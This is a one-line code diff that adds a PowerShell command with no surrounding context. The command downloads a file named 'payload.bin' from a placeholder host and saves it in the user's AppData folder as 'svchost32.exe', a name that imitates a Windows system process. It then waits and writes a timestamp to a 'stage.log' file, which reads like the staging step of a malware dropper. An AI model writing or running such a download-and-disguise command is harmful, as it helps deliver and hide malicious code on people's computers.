@@ -1,0 +1,1 @@
+$TransferUrl = 'http://contoso.com/payload.bin'; $PayloadPath = "$env:APPDATA\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($TransferUrl, $PayloadPath); Start-Sleep -Seconds 28; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
